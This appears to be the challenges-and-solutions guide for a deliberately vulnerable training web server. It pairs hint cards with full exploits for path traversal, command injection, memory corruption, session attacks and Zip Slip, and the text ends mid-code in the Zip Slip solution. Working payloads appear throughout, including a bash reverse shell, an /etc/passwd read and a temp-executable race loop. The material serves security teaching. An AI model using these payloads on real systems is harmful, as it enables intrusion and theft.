# Challenges & Solutions

Every intentional vulnerability in this server is a numbered challenge.
Each section below pairs a *card* (scenario + progressive hints) with its
*solution* (full exploit).

Challenges are grouped into three tiers by what it takes to trigger the
primitive — find the bug, understand the mechanism, or compose earlier
primitives. Numbering is historical: challenges keep their CH-XX IDs
across tiers so cross-references (tests, corpus, cards) stay stable.

⚠️ **Spoilers.** Each card is immediately followed by its full exploit. If
you're playing the CTF, work through the card first and only read on when
you're stuck.

## Beginner — trigger the primitive

A single request triggers the primitive: a leaked pointer, a replayed
session, a crashed process, a shell.

| #   | Challenge                                    | Class      | CWE     | Solution |
|-----|----------------------------------------------|------------|---------|----------|
| 02  | [Command Injection](#challenge-02)           | Web        | CWE-78  | [02](#solution-02) |
| 03  | [Uncontrolled Format String](#challenge-03)  | Memory     | CWE-134 | [03](#solution-03) |
| 04  | [Session Fixation](#challenge-04)            | Web        | CWE-384 | [04](#solution-04) |
| 12  | [Stack Buffer Overflow (path)](#challenge-12)| Memory     | CWE-121 | [12](#solution-12) |

## Intermediate — understand the mechanism

Triggering the primitive requires understanding the mechanism: a path
before and after canonicalization, a seed and its real entropy, a
buffer before and after decoding, a declared length and the allocation
it produced.

| #   | Challenge                                    | Class      | CWE     | Solution |
|-----|----------------------------------------------|------------|---------|----------|
| 01  | [Path Traversal](#challenge-01)              | Web        | CWE-22  | [01](#solution-01) |
| 05  | [Predictable Session ID](#challenge-05)      | Crypto/Web | CWE-330 | [05](#solution-05) |
| 07  | [Username Info Leak](#challenge-07)          | Memory     | CWE-125 | [07](#solution-07) |
| 09  | [Heap Buffer Overflow](#challenge-09)        | Memory     | CWE-122 | [09](#solution-09) |
| 10  | [Integer Overflow](#challenge-10)            | Memory     | CWE-190 | [10](#solution-10) |

## Advanced — compose primitives

These challenges require chaining an earlier challenge's output into
the next one's input: a leak that defeats ASLR, a groomed chunk placed
in a freed object, a session that unlocks admin-only setup steps.

| #   | Challenge                                    | Class      | CWE     | Solution |
|-----|----------------------------------------------|------------|---------|----------|
| 06  | [Insecure Temporary Executable Race](#challenge-06) | System | CWE-377 | [06](#solution-06) |
| 08  | [Use-After-Free (LogSink)](#challenge-08)    | Memory     | CWE-416 | [08](#solution-08) |
| 11  | [Type Confusion](#challenge-11)              | Memory     | CWE-843 | [11](#solution-11) |

### Bonus — outside the tracks

| #   | Challenge                                    | Class      | CWE     | Solution |
|-----|----------------------------------------------|------------|---------|----------|
| 13  | [Global BOF (argv)](#challenge-13)           | Memory     | CWE-121 | [13](#solution-13) |

Local-only argv overflow; not part of any track.

## Primitive ledger

What each challenge provides, and what the advanced ones require. This
table backs the [tracks](#tracks).

| #  | Challenge              | Provides                                        | Consumes |
|----|------------------------|-------------------------------------------------|----------|
| 01 | Path traversal         | arbitrary file read (`/proc/self/maps` → layout) | — |
| 02 | Command injection      | immediate command execution via the shell       | — |
| 03 | Format string          | stack disclosure (`%p`); write primitive (`%n`, advanced extension) | — |
| 04 | Session fixation       | authenticated `admin` session                   | a planted/observed pre-auth cookie |
| 05 | Predictable session    | authenticated `admin` session                   | mint time (±3 s) and the server PID |
| 06 | Temp-executable race   | command execution given local shell             | local shell (e.g. from 02 or 11) or file write to `/tmp` (14) |
| 07 | Identity-record leak   | stale-stack pointers — ASLR defeat              | — |
| 08 | LogSink UAF            | controlled virtual call                         | a leak (01/03/07) + a heap groom (09) |
| 09 | Decode-sizing overflow | precise heap write: chosen size class, chosen bytes | — |
| 10 | Integer overflow       | bulk heap overflow (size picked by the wrap, less precise) | — |
| 11 | Type confusion         | unauthenticated command execution               | an admin session (04 or 05) |
| 12 | Stack overflow         | RIP control on the default build; ROP with a leak (advanced extension) | a leak (01/03/07) for the ROP extension |
| 13 | Global BOF (argv)      | adjacent-global corruption                      | local process invocation |
| 14 | Zip Slip               | arbitrary file write (chosen path, chosen content) | authenticated admin session (04 or 05) |

<a id="tracks"></a>

## Tracks

The intended chains, in order, with the hand-offs between challenges
called out.

### Track 1 · Web to RCE (session subversion)

```
04 session fixation  ─┐
                      ├─► authenticated admin session
05 session prediction ┘          │
                                ▼
        11 add_rule + update_rule    (admin-only setup)
                                │
                                ▼
        /cgi-bin/* trigger           (no credentials)
```

1. Take over the admin session — plant and inherit one via fixation
   (04), or predict one from the mint second and PID (05).
2. The session admits every `/admin/*` route: register a static rule
   whose `directory` is your command, then flip its tag with
   `/admin/update_rule` (11).
3. Trigger it unauthenticated on `/cgi-bin/*` — `execute()` runs the
   mis-tagged rule's string through `popen()`.

Walkthrough: the solution sections of 04 → 05 → 11.

### Track 2 · Memory exploitation (leak → groom → hijack)

Four stages, one challenge each:

```
07 identity-record leak ──► pointers / layout (ASLR defeat)
        │   (03 %p or 01 reading /proc/self/maps are alternates)
        ▼
09 decode-sizing overflow ──► precise heap write:
        │                      your size class, your bytes
        ▼
08 LogSink swap ──► freed vtable target; ≥ 250 ms window
        │            between the delete and the use
        ▼
   controlled virtual dispatch (RIP)
```

1. **Leak** (07): read the stale stack out of the 128-byte `/whoami`
   record — stack, library and heap pointers for the layout.
2. **Groom** (09): `%GZ`-laced `status=` input sizes the allocation
   into the freed sink's chunk class while `%XX` escapes pick the
   exact bytes; the first 8 bytes become a fake vtable pointer.
3. **Hijack** (08): swap `/admin/logging?output=...` to free the old
   sink while a queued record still holds it; the async worker's
   `sink->write()` dispatches through your vtable.

Note: the regression suite asserts the use-after-free fires
(`heap-use-after-free` under ASan); pointer-accurate vtable poisoning
depends on allocator layout.

### Track 3 · Post-ASLR ROP (advanced extension)

12's beginner outcome is RIP control on the default (non-hardened)
build. The advanced extension is the same overwrite against a hardened
build — canary-preserving, ROP — which needs addresses. Use a leak
from 07 (or 03 / 01 via `/proc/self/maps`), rebuild with
`ENABLE_HARDENING=ON`, and repeat.

### Track 4 · Zip Slip to Temp Race RCE

```
04 session fixation  ─┐
                      ├─► authenticated admin session
05 session prediction ┘          │
                                 ▼
         14 deploy_site (Zip Slip)    (admin-only)
                                 │
                                 ▼
         arbitrary file write to /tmp/dvws_cgi_<pid>
                                 │
                                 ▼
         06 temp executable race
                                 │
                                 ▼
         command execution
```

1. **Gain admin session** — plant and inherit one via fixation (04),
   or predict one from the mint second and PID (05).
2. **Craft malicious ZIP** — create a ZIP file with an entry named
   `../../../../tmp/dvws_cgi_<pid>` containing your executable payload.
   Get the server PID from `/status`.
3. **Deploy via Zip Slip** — POST the ZIP to `/admin/deploy_site`. The
   vulnerable extraction writes your payload to `/tmp/dvws_cgi_<pid>`.
4. **Trigger temp race** — immediately request `/cgi-helper`. The server
   attempts to stage its own helper but races with your pre-planted file.
   If you win the race, your code executes.

This combines web-level path traversal (14) with a filesystem race
condition (06) to achieve remote command execution.

Walkthrough: the solution sections of 04 → 05 → 14 → 06.

---

<a id="challenge-01"></a>

## 01 · Path Traversal (CWE-22)

### Scenario

The static handler used to join the document root and the request path
with a bare `strcat`. That was later "fixed": the joined path is now
canonicalized (resolving `..` segments and symlinks) behind a
document-root containment guard. The order is wrong. The guard inspects
the *lexical* joined path — which begins with the docroot by
construction, so it can never fire — while the canonicalized result,
the string actually handed to the filesystem, is never re-checked.

### Endpoint

Any URL served by the static handler, e.g. `GET /index.html`.

### Sink

`handlers/static_files.cpp` — the containment check on `joined`
followed by `weakly_canonical(joined)`.

### Hints

1. Read the guard closely: which string is it inspecting, and who built
   that string?
2. What does `weakly_canonical()` do to `..` segments?
3. If a check always passes, what is it actually checking?

### Expected primitive

Arbitrary file read within the process's uid.

### Chaining

The file read can also defeat ASLR: `/proc/self/maps` works in place
of a memory leak in Tracks 2 and 3.

### Regression test

`tests/exploit/test_path_traversal.py`

<a id="solution-01"></a>

### Solution — 01 · Path Traversal

**Code**: `handlers/static_files.cpp` → guard checks `joined`
(docroot + path, tautologically docroot-prefixed), then serves
`weakly_canonical(joined)` unchecked.

Access files outside the web root:

```bash
curl --path-as-is "http://127.0.0.1:8081/../../../../../../../etc/passwd"
```

`--path-as-is` is required because curl normalizes `..` by default.
The `..` segments survive the guard (it never inspects them after
resolution) and are collapsed by canonicalization into a path far
outside the docroot.

**The fix**: canonicalize first, then check containment — compare the
*canonicalized* result against the canonicalized docroot, and reject
anything that does not stay under it.

---

<a id="challenge-02"></a>

## 02 · Command Injection (CWE-78)

### Scenario

The log viewer is a deliberate, believable ops feature: a default `tail`
view, a server-side whitelisted `level` filter, and a free-text
`search` parameter. The developer knew raw interpolation was dangerous,
so the search term is URL-decoded and passed through `shell_escape()`
before being placed in a `grep` pipeline. `shell_escape()` wraps its
argument in double quotes. Quoting is not escaping: an embedded double
quote terminates the argument early, and `$` / backticks are
substituted *inside* double quotes.

### Endpoint

`GET /logs` · `GET /logs?level=error|warning|info` · `GET /logs?search=<free text>`

### Sink

`request_logger.cpp` — `command += " | grep -i " + shell_escape(url_decode(search));`

### Hints

1. The `level` parameter is whitelisted. Why does `search` still reach
   the shell?
2. What does double-quoting actually protect against? What character
   terminates a double-quoted string?
3. What happens to `$(...)` inside double quotes?

### Expected primitive

Arbitrary OS command execution as the server user.

### Chaining

Provides local shell access, which 06 requires.

### Regression test

`tests/exploit/test_cmd_injection.py`

<a id="solution-02"></a>

### Solution — 02 · Command Injection

**Code**: `request_logger.cpp` → `shell_escape()` = `return "\"" + s + "\"";`

Break out of the quotes and run a command of your own:

```bash
# search = "; id " -> escaped as ""; id "" -> id runs in the pipeline
curl "http://127.0.0.1:8081/logs?search=%22%3B%20id%20%22"

# Command substitution executes even *inside* double quotes
curl "http://127.0.0.1:8081/logs?search=%24%28whoami%29"
```

Reverse shell (listener on 4444), same breakout:

```bash
curl "http://127.0.0.1:8081/logs?search=%22%3B%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F4444%200%3E%261%20%22"
```

**The lesson**: shell escaping is a parser problem — every fix that
keeps building a shell *string* chases the next metacharacter. The
correct design never invokes a shell: `execve()`/`posix_spawn()` the
`grep` binary directly with an argv array.

---

<a id="challenge-03"></a>

## 03 · Uncontrolled Format String (CWE-134)

### Scenario

The access logger writes query parameter values through the
format-safe `"%s"` form. But it also records a per-request "custom
field" — the client-supplied `X-Forwarded-For` address, a common
request-tracing habit behind proxies — through a helper that passes
the field to `fprintf()` as the *format string* itself. The missing
`"%s"` indirection is an implementation mistake inside an ordinary
logging pipeline, not a sink placed in the request path for
exploitation.

### Endpoint

Any request carrying an `X-Forwarded-For` header.

### Sink

`request_logger.cpp` → `write_custom_field()` →
`fprintf(log_file, field.c_str());`

### Hints

1. Query parameter values now land in the log literally. Which *other*
   request-controlled string gets logged?
2. Which header would a logging pipeline behind a proxy trust?
3. `%p` leaks stack slots; `%n` writes (glibc-dependent).

### Expected primitive

Beginner outcome: memory disclosure via `%p`. Advanced extension: a
write primitive via `%n` (glibc-dependent).

### Chaining

The `%p` leak is an alternate ASLR defeat feeding Tracks 2 and 3; the
`%n` write (advanced extension) is a standalone write primitive.

### Regression test

`tests/exploit/test_format_string.py`

<a id="solution-03"></a>

### Solution — 03 · Uncontrolled Format String

**Code**: `request_logger.cpp` → `fprintf(log_file, field.c_str());`

Leak stack values via the forwarding header:

```bash
curl -H "X-Forwarded-For: %p.%p.%p.%p.%p" http://127.0.0.1:8081/
```

Inspect `/tmp/server.log` for the `X-Forwarded-For:` line to see the
expanded pointers. On glibc-based Linux, replacing `%p` with `%n`
gives a write primitive.

---

<a id="challenge-04"></a>

## 04 · Session Fixation (CWE-384)

### Scenario

Sessions have an explicit lifecycle: an anonymous session
(client-chosen or server-minted) → its owner logs in → *the same
Session object* is upgraded in place to `authenticated:admin`. The
identifier is never rotated across that privilege transition, and the
router admits an authenticated session with no credentials at all. An
attacker who plants or learns the pre-auth ID therefore inherits the
authenticated session.

### Endpoint

`/admin/*` with `Cookie: session_id=...`.

### Sink

`router.cpp` — `set_session_data(session_id, "authenticated:admin")`
(no rotation) plus the session-admission branch that grants `/admin/*`
on session state alone.

### Hints

1. What does a real login flow do to the session ID when privileges
   change?
2. Seed a cookie, authenticate with it, then replay the cookie *alone*.
3. Watch the login response for a `Set-Cookie` that never comes.

### Expected primitive

Account takeover after victim login (given the ability to plant a
cookie).

### Chaining

Feeds Track 1: the inherited session admits every `/admin/*` route —
the setup steps of 08, 09, 10 and 11 all become reachable.

### Regression test

`tests/exploit/test_session_fixation.py`

<a id="solution-04"></a>

### Solution — 04 · Session Fixation

**Code**: `router.cpp` → the anonymous session is upgraded in place on
login; authenticated sessions are admitted without credentials.

1. Attacker seeds the session:
   ```bash
   curl -H "Cookie: session_id=EVIL_SESSION" http://127.0.0.1:8081/
   ```
2. Victim authenticates (still using the same cookie — note the login
   response carries **no** `Set-Cookie`, the ID was not rotated):
   ```bash
   curl -H "Cookie: session_id=EVIL_SESSION" \
        -H "Authorization: Basic YWRtaW46YWRtaW4=" \
        http://127.0.0.1:8081/admin/
   ```
3. Attacker replays — no credentials needed, the same session object
   is now authenticated:
   ```bash
   curl -H "Cookie: session_id=EVIL_SESSION" http://127.0.0.1:8081/admin/
   ```

**The fix**: rotate on privilege change — mint a fresh ID at login,
invalidate the pre-auth one, and reject client-chosen identifiers that
were never issued by the server.

---

<a id="challenge-05"></a>

## 05 · Predictable Session ID (CWE-330)

### Scenario

`generate_session_id()` was "hardened" beyond the old
`srand(time(0)) + rand()` scheme: the PRNG output is now XOR-mixed
with the process ID before being rendered as
`SESSION_<8 hex digits>`. Every ingredient remains predictable: the
seed is a one-second-resolution wall clock, and the PID is a small,
externally observable integer. Two sessions minted in the same second
are even *identical*.

### Endpoint

Any endpoint whose response contains `Set-Cookie: session_id=SESSION_<hex8>`.

### Sink

`session_manager.cpp` — `srand(time(0)); ... snprintf(..., "SESSION_%08x", a ^ b);`

### Hints

1. What are the two ingredients, and how much entropy does each really
   contribute?
2. Request two sessions back-to-back and compare the IDs.
3. Where can an attacker observe a process ID?

### Expected primitive

Session-ID prediction leading to hijack of a victim's authenticated session.

### Chaining

Feeds Track 1 like 04; prediction needs no planted cookie.

### Regression test

`tests/exploit/test_predictable_session.py`

<a id="solution-05"></a>

### Solution — 05 · Predictable Session ID

**Code**: `session_manager.cpp` → `srand(time(0)); rand() ^ getpid()`.

Quick observable: two mints within the same second produce the *same*
ID (same seed, same PID).

Given a target session minted at `T` (a unix epoch second) and the
server's PID, an attacker recreates the exact value:

```c
srand(T);
uint32_t a = rand();
uint32_t b = getpid_of_server();
printf("SESSION_%08x\n", a ^ b);
```

Brute a small window around `time(0)` (±3 seconds) and, if needed, a
small PID range. Then hijack:

```bash
curl -H "Cookie: session_id=SESSION_<predicted>" http://127.0.0.1:8081/admin/
```

---

<a id="challenge-06"></a>

## 06 · Insecure Temporary Executable Race (CWE-377 / CWE-367)

### Scenario

`GET /cgi-helper` stages a copy of the bundled native CGI helper
executable (`dvws_cgi_helper`) at `/tmp/dvws_cgi_<pid>`, **closes** it,
waits out an intentional window, then `chmod`s it and executes it via
`popen()`. The filename is predictable and the staged file sits closed
and replaceable in world-writable `/tmp` during the whole window: a
textbook close-before-execute TOCTOU race.

### Endpoint

`GET /cgi-helper`

### Sink

`mime_type_handler.cpp` — `snprintf(temp_file_path, ..., "/tmp/dvws_cgi_%d", pid)`
followed by `fclose()` → window → `chmod()` → `popen(temp_file_path)`

### Hints

1. What is the PID of the server process?
2. The staged file is closed before it is executed. What can you do to
   a closed file at a predictable path in a world-writable directory?
3. Can you write your replacement between `fclose()` and `popen()`?

### Expected primitive

Arbitrary native code execution as the server user given local shell
access.

### Chaining

Consumes local shell access — which 02 or 11 provide when you
started remote.

### Regression test

`tests/exploit/test_temp_exec_race.py`

<a id="solution-06"></a>

### Solution — 06 · Insecure Temporary Executable Race

**Code**: `mime_type_handler.cpp` → `/tmp/dvws_cgi_<pid>`.

Requires local shell access on the server host.

```bash
# In one terminal: replace the staged executable as fast as possible.
PID=$(pgrep damn_vulnerable_web)
while :; do
    printf '#!/bin/sh\nid\n' > "/tmp/dvws_cgi_${PID}" 2>/dev/null
    chmod +x "/tmp/dvws_cgi_${PID}" 2>/dev/null
done

# In another terminal: trigger helper requests until the race wins.
while :; do curl -s http://127.0.0.1:8081/cgi-helper; done
```

The server `fopen()`s the predictable path (truncating whatever is
there), copies the bundled helper in, `fclose()`s it, and then — after
a deliberate window — `chmod 0755` and executes whatever now lives at
that path as the server user. A write that lands in the window
replaces the staged executable; the next thing the server runs is
yours. The regression test wins the race the same way and checks the
replaced program's output in the HTTP response.

---

<a id="challenge-07"></a>

## 07 · Username Info Leak (CWE-125)

### Scenario

`/whoami` answers with a fixed 128-byte identity record so downstream
tooling can parse it without a length-prefixed protocol. `snprintf()`
formats `username=%s\n` into the record; the response then transmits
the **entire buffer**. Only the formatted bytes (plus a NUL) were ever
initialized — everything after the NUL is stale stack memory from this
worker thread's previous request handling: pointers, request remnants,
session state.

### Endpoint

`GET /whoami` (requires `Authorization: Basic ...`)

### Sink

`handlers/admin.cpp` — whoami():
`send_status(..., std::string(response, sizeof(response)), ...)`

### Hints

1. Compare the Content-Length (always 128) with the length of the
   formatted `username=...` prefix.
2. Which earlier activity on this worker thread wrote the bytes you
   are now reading?
3. Fire a request with long headers first, then `/whoami` — the
   leaked tail changes.

### Expected primitive

Uninitialized read → disclosure of stale stack contents (pointers →
ASLR defeats for the memory-corruption challenges).

### Chaining

First stage of Track 2: the leaked pointers supply the addresses for
08's fake vtable and 12's ROP extension.

### Regression test

`tests/exploit/test_username_leak.py`

<a id="solution-07"></a>

### Solution — 07 · Username Info Leak

**Code**: `handlers/admin.cpp` → the 128-byte record is transmitted in
full regardless of the formatted length.

```bash
curl -s -u admin:admin http://127.0.0.1:8081/whoami | xxd
```

The body starts with `username=admin\n`, then a NUL, then ~113 bytes
of stack garbage. Send a request with long headers first, then connect
again — pointers into heap, stack and libraries leak, defeating ASLR
for challenges 08–12.

**The fix**: transmit only what was formatted —
`std::string(response, strlen(response))` — or build the record in a
`std::string` so the buffer length *is* the data length.

---

<a id="challenge-08"></a>

## 08 · Use-After-Free — Logging Sinks (CWE-416)

### Scenario

The access log can be redirected at runtime:
`/admin/logging?output=file|syslog` swaps the installed `LogSink` — a
C++ object with a *virtual* `write()`. Request threads don't log
synchronously; they enqueue `{record, LogSink*}` entries for a
background worker that batches records for at least 250 ms before
flushing. The captured sink pointer travels with the record. Swapping
the output **deletes the outgoing sink immediately**; queued records
keep the stale pointer, and the worker's later `sink->write()` is a
virtual call dispatching through a vtable pointer read from freed
memory.

### Endpoint

`GET /admin/logging?output=file`
`GET /admin/logging?output=syslog`

### Sink

`logging_sink.cpp` — `install_log_sink()` deletes the old sink;
`worker_loop()` calls `entry.sink->write(entry.record)` on records
queued before the swap.

### Hints

1. A record remembers the sink that was installed when it was
   captured. Who owns that pointer now?
2. The worker flushes no earlier than 250 ms after capture — that is
   your window between the delete and the use.
3. A virtual call must first read a vtable pointer from the object.
   What can reclaim that memory — and which challenge lets you size
   allocations freely?

### Expected primitive

Virtual call through a dangling vtable pointer → RIP control once the
freed chunk is reclaimed with a fake vtable pointer (heap grooming via
challenge 09).

### Chaining

Final stage of Track 2 — consumes a leak (01/03/07) for addresses and
09 for the groom that reclaims the freed sink chunk.

### Regression test

`tests/exploit/test_uaf_logger.py` (hard crash under `--asan`)

<a id="solution-08"></a>

### Solution — 08 · Use-After-Free (Logging Sinks)

**Code**: `logging_sink.cpp` → `install_log_sink()`: `delete old;`
while queue entries still hold `old`; `worker_loop()`:
`entry.sink->write(entry.record)`.

```bash
# 1. Install the file sink.
curl -u admin:admin "http://127.0.0.1:8081/admin/logging?output=file"

# 2. Generate a log record that captures the FileLogSink pointer.
#    (Records wait >= 250 ms in the queue before the worker flushes.)
curl "http://127.0.0.1:8081/index.html"

# 3. Swap the sink: the FileLogSink is deleted while the record is
#    still queued.
curl -u admin:admin "http://127.0.0.1:8081/admin/logging?output=syslog"

# 4. The worker flushes the stale record and dispatches virtually
#    through freed memory. Under ASan this aborts with
#    heap-use-after-free; on a plain build it crashes as soon as the
#    chunk has been reclaimed by other allocations.
```

For control-flow hijack: between steps 3 and 4 (the ≥ 250 ms window),
groom the freed chunk with challenge 09 so its first 8 bytes — the
vtable slot — point at a fake vtable whose `write()` entry is your
target function.

**The fix**: shared ownership — capture a `std::shared_ptr<LogSink>`
in each queue entry, or drain and synchronize the queue before
deleting a sink.

---

<a id="challenge-09"></a>

## 09 · Heap Buffer Overflow — Decode Sizing (CWE-122)

### Scenario

`system_status` sizes its decode buffer with a shared helper, then
decodes into it. `estimate_decoded_length()` (utils.cpp) assumes every
`%` begins a valid three-character `%XX` escape and counts **one**
output byte per escape. The decoder in handlers/admin.cpp leaves
malformed escapes **verbatim**: `%GZ` is not a valid escape, so all
three characters are copied. Two implementations of the same encoding
rule drifted apart — input laced with malformed escapes decodes to up
to 3× the estimated size and the copy runs off the allocation.

### Endpoint

`POST /admin/system_status` (Basic auth)

### Sink

`handlers/admin.cpp` —
`malloc(estimate_decoded_length(status_pos) + 1)` followed by
`decode_status_param(status_pos, status_msg)`.

### Hints

1. Well-formed input (`%41`) sizes perfectly. What does `%GZ` cost in
   the estimator versus the decoder?
2. You control both the decoded *contents* and the allocation *size* —
   that makes it a heap-grooming primitive.
3. Combine with challenge 08: a freed sink chunk is a target your
   sizing can land in.

### Expected primitive

Adjacent heap corruption with fully controlled contents and size
class; fake-vtable construction for the UAF chain.

### Chaining

Second stage of Track 2: the controlled size class and contents are
what reclaim 08's freed `LogSink` with a fake vtable pointer.

### Regression test

`tests/exploit/test_heap_overflow.py` (build with `--asan` for a clear
crash)

<a id="solution-09"></a>

### Solution — 09 · Heap Buffer Overflow (Decode Sizing)

**Code**: `estimate_decoded_length()` counts `%GZ` as one byte;
`decode_status_param()` writes three.

```bash
curl -u admin:admin -X POST "http://127.0.0.1:8081/admin/system_status" \
    -d "status=$(python3 -c 'print("%GZ"*200)')"
```

200 malformed escapes → estimate 200 → `malloc(201)` → the decoder
writes 600 bytes. Valid escapes (`%XX`) decode one byte each and stay
within the estimate, so the bug only fires on the malformed case. The
decoder *does* honor `%XX`, so the overflowing bytes themselves are
arbitrary: encode the payload with valid escapes while sizing the
allocation with malformed ones.

**The fix**: one implementation of the sizing rule — have the decoder
return the number of bytes written, or decode through a bounded writer
that grows on demand. Never keep two hand-rolled copies of the same
encoding rule.

---

<a id="challenge-10"></a>

## 10 · Integer Overflow → Heap Overflow (CWE-190)

### Scenario

`upload_file` stores uploads as a fixed 64-byte `UploadHeader`
followed by the body. The allocation sums three individually harmless
fields in 32-bit arithmetic — `sizeof(UploadHeader)`, the declared
`Content-Length`, and the declared `X-Filename-Length`. Lengths near
`UINT_MAX` wrap the total to a tiny allocation, while the copy below
uses the **original** `Content-Length` for both its offset and its
length.

### Endpoint

`POST /admin/upload_file` (Basic auth)

### Sink

`handlers/admin.cpp` —
`(uint32_t)sizeof(UploadHeader) + content_len + filename_len`

### Hints

1. Three fields, each reasonable on its own. What is their sum
   mod 2³²?
2. `recv()`'s destination offset *and* length still use the original
   values.
3. ASan validates the recv buffer up front — the declared body does
   not even have to arrive.

### Expected primitive

Massive controlled heap overflow.

### Chaining

Same allocation bug as 09, but the wrap picks the size, so the write
is larger and less precise.

### Regression test

`tests/exploit/test_int_overflow.py` (build with `--asan`)

<a id="solution-10"></a>

### Solution — 10 · Integer Overflow

**Code**: `handlers/admin.cpp` → the 32-bit sum of header + body +
filename lengths.

```python
import socket
s = socket.socket()
s.connect(('127.0.0.1', 8081))

payload = (
    b"POST /admin/upload_file HTTP/1.1\r\n"
    b"Host: 127.0.0.1\r\n"
    b"Authorization: Basic YWRtaW46YWRtaW4=\r\n"
    b"Content-Length: 4294967168\r\n"   # 2^32 - 128
    b"X-Filename-Length: 64\r\n\r\n"    # 64 + body + 64 = 2^32 -> 0
    + b"A" * 200
)
s.send(payload)
s.close()
```

`allocation` wraps to 0 → `malloc(0)`; the 64-byte header
initialization and `recv(file_buffer + 64, 4294967168, 0)` then write
far past the chunk. Under ASan the server aborts with a
heap-buffer-overflow trace.

**The fix**: checked arithmetic (`__builtin_add_overflow`) on every
summed field, and a sanity cap on declared lengths before any
allocation is made.

---

<a id="challenge-11"></a>

## 11 · Type Confusion — Route Metadata (CWE-843)

### Scenario

Routes form a normal C++ hierarchy: `StaticRoute` (serves a directory)
and `CgiRoute` (runs an executable), both deriving from `Route`.
Separately, the router keeps a metadata map `path → RouteType` that
mirrors each object's class for dispatch decisions. `/admin/update_rule`
rewrites the metadata entry — but never reconstructs the object it
describes. A `StaticRoute` tagged `CGI` now reaches dispatch, where
`static_cast<CgiRoute*>(rule)->execute()` reads the StaticRoute's
`directory` string (the same member offset as `CgiRoute::executable`)
and runs it as a command.

### Endpoint

1. `GET /admin/add_rule?type=static&path=/cgi-bin/pwn&directory=<command>` (Basic auth)
2. `GET /admin/update_rule?path=/cgi-bin/pwn&type=cgi` (Basic auth)
3. `GET /cgi-bin/pwn` (no auth)

### Sink

`handlers/cgi.cpp` —
`if (route_types()[rule->path] == RouteType::CGI) static_cast<CgiRoute*>(rule)->execute(...)`

### Hints

1. Two sources of truth describe one object's type. Which one does
   dispatch trust?
2. Where does `directory` sit inside a `StaticRoute`, and where does
   `execute()` look for `executable`?
3. The trigger needs no credentials. How do you reach the admin
   endpoints without the password? (Challenges 04 / 05.)

### Expected primitive

Arbitrary command execution as the server user via the unauthenticated
`/cgi-bin/*` dispatch.

### Chaining

Final stage of Track 1 — the admin-only setup is reachable with a
hijacked session (04/05); the trigger itself needs no credentials.

### Regression test

`tests/exploit/test_type_confusion.py`

<a id="solution-11"></a>

### Solution — 11 · Type Confusion (Route Metadata)

**Code**: `handlers/admin.cpp` → `update_rule()` rewrites
`route_types()` only; `handlers/cgi.cpp` → blind `static_cast`.

```bash
# 1. Register a static rule whose directory string is your command.
curl -u admin:admin "http://127.0.0.1:8081/admin/add_rule?type=static&path=/cgi-bin/pwn&directory=id"

# 2. Flip the metadata tag; the StaticRoute object is NOT reconstructed.
curl -u admin:admin "http://127.0.0.1:8081/admin/update_rule?path=/cgi-bin/pwn&type=cgi"

# 3. Trigger the confused dispatch: execute() runs `directory` as the
#    CGI executable and streams the output back.
curl "http://127.0.0.1:8081/cgi-bin/pwn"     # -> uid=...
```

No memory is corrupted: both strings occupy the same member offset
(ordinary single-inheritance layout), so the blind cast reads in
bounds — the damage is semantic, not memory-safety. Chain with
challenge 04 (session fixation) or 05 (predictable session IDs) to
reach the admin endpoints without the password, then flip any static
rule into a CGI runner.

**The fix**: one source of truth — make the type query virtual
(`virtual RouteType type() const`) or store the tag inside the object;
never allow an update path that changes one representation without the
other.

---

<a id="challenge-12"></a>

## 12 · Stack Buffer Overflow — Request Path (CWE-121)

### Scenario

`HttpRequest::parse()` copies the request path with a raw `strcpy` into
`clean_path[200]`. Any path longer than 200 bytes overwrites the parser's
saved registers.

### Endpoint

Any HTTP request whose path is longer than 200 bytes.

### Sink

`http/request.cpp` — `strcpy(out.clean_path, path_with_query);`

### Hints

1. What is the maximum request size the server will `recv()`?
2. That upper bound shapes your payload space.
3. `--fuzz` mode runs the same parser from stdin without the network cap.

### Expected primitive

Beginner outcome: RIP control on the default (non-hardened) build.
Advanced extension: hardened-build ROP using a leak from 01/03/07
(Track 3).

### Chaining

Track 3: overwrite the return address first, then repeat against a
hardened build using a leak (01/03/07) for the addresses.

### Regression test

`tests/exploit/test_stack_bof.py`

<a id="solution-12"></a>

### Solution — 12 · Stack Buffer Overflow (Request Path)

**Code**: `http/request.cpp` → `strcpy(out.clean_path, path_with_query);`

```bash
curl --path-as-is "http://127.0.0.1:8081/$(python3 -c 'print("A"*300)')"
```

The server crashes on return from the parser frame. Because `recv()`
caps at 1024 bytes, your payload has ~1000 usable bytes. Build with
`ENABLE_HARDENING=OFF` (the default) to avoid canaries.

---

<a id="challenge-14"></a>

## 14 · Zip Slip (CWE-22)

### Scenario

The admin console includes a "Quick Deploy" feature for rapid static
site deployment: upload a .zip containing HTML/CSS/JS files, and the
server extracts it to `serve/deploy/` and serves it immediately at
`/deploy/`. This is a realistic pattern seen in hosting control panels,
CMS theme installers, and deployment tools.

The extraction handler constructs output paths by concatenating the
deployment directory with ZIP entry filenames without validation. A
malicious ZIP entry named `../../index.html` or
`../../../../tmp/evil.sh` escapes the deployment directory and writes
to arbitrary filesystem locations.

### Endpoint

`POST /admin/deploy_site` (requires HTTP Basic auth: `admin:admin`)

### Sink

`handlers/deploy.cpp` — extraction loop constructs output paths as:
```cpp
snprintf(output_path, sizeof(output_path), "%s/%s", 
         deploy_dir, file_stat.m_filename);
```
No canonicalization or containment check on `file_stat.m_filename`.

### Hints

1. What happens when a ZIP entry filename contains `../` sequences?
2. Where is the deployment directory relative to the web root `serve/`?
3. Can you write to locations outside `serve/deploy/`? What about `/tmp`?
4. Which other challenge uses predictable paths in `/tmp`?

### Expected primitive

Arbitrary file write (attacker-controlled path and content) anywhere the
server process has write permissions.

### Chaining

**Requires:** Admin session (04 or 05)

**Provides:**
- Web defacement: overwrite `serve/index.html`
- Admin panel replacement: overwrite `serve/admin/index.html` for phishing
- File write to `/tmp` → chains with 06 (temp executable race) for RCE

### Real-world examples

- cPanel "Extract Archive" feature
- WordPress theme/plugin installer
- Hosting control panel ZIP uploads
- Netlify/Vercel deployment mechanisms
- Many web-based file managers

### Regression test

`tests/exploit/test_zip_slip.py`

<a id="solution-14"></a>

### Solution — 14 · Zip Slip

**Code**: `handlers/deploy.cpp` → extraction uses entry filename directly:

```cpp
for (int i = 0; i < num_files; i++) {
    mz_zip_archive_file_stat file_stat;
    mz_zip_reader_file_stat(&zip, i, &file_stat);
    
    char output_path[1024];
    snprintf(output_path, sizeof(output_path), "%s/%s", 
             deploy_dir, file_stat.m_filename);  // VULNERABLE
    
